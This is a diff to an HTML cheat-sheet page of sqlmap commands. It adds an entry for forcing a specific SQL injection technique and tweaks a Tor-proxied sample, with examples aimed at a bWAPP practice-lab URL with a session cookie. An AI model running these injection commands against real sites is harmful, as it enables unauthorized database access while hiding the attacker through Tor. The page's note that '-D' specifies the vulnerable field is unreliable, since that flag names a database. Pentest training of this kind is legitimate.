@@ -90,11 +90,15 @@
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#sqlmap09')">.0x9.</button>
 
 <b>0x10: use proxy TOR </b><p id="sqlmap10"><mark>sqlmap --tor --tor-type=SOCKS5 --check-tor -u INSERT_VULN_URL --cookie=" " -b</mark></p>
-<b>SAMPLE:</b> sqlmap --tor --tor-type=SOCKS5 --check-tor -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" --dbs <br>
+<b>SAMPLE:</b> sqlmap --tor --tor-type=SOCKS5 --check-tor -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" -b <br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#sqlmap10')">.0x10.</button>
 
+<b>0x11: exploit specific technique </b><p id="sqlmap11"><mark>sqlmap -u INSERT_VULN_URL --cookie=" " --technique=?</mark></p>
+<b>SAMPLE:</b> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" --technique=U <br>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#sqlmap11')">.0x11.</button>
+
 <b>NOTES:</b> 
-1. vulnerable field can be specified with -D flag.
+1. vulnerable field can be specified with <b>-D</b> flag.
 2. most of time file results are stored in <b>"/home/USER/.local/share/sqlmap/output/</b>..."
 
 </div>
